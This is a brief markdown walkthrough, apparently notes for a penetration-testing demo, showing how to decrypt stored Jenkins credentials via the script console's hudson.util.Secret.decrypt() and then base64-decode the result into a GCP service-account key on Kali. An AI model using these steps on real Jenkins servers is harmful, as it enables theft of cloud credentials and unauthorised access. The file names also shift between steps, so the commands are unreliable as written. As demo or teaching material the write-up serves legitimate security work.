# Jenkins Decrypt
Now that we're in Jenkins, we'll look a bit around

## Secrets
There are predefined secrets.
Some maybe used for Terraform
Lets decrypt them

### Get the secret
Open 
```
http://jenkins.test.nevervictimconsult.xyz/script
```
and start following script
```java
println( hudson.util.Secret.decrypt("${ENCRYPTED_PASSPHRASE_OR_PASSWORD}") )
```
where `${ENCRYPTED_PASSPHRASE_OR_PASSWORD}` is the encrypted content of the `<password>` or `<passphrase>` XML element that you are looking for.
And in order to get the password value of `${ENCRYPTED_PASSPHRASE_OR_PASSWORD}` go to credentials, update, in the browser "See source code" and you will get the encrypted password in the data field for password. Then use that function.

What you got is the base64 encoded json string for authenticating to GCP.
Next up: decode it.

### decode
Paste it into Kali

```bash
mkdir -p /root/demotalk/cloudAccess
cd /root/demotalk/cloudAccess
nano encoded.json
```

paste the string into `encrypted.json` and decode it then

```bash
cd /root/demotalk/cloudAccess
cat encode.json | base64 --decode > gcpSa.json
```
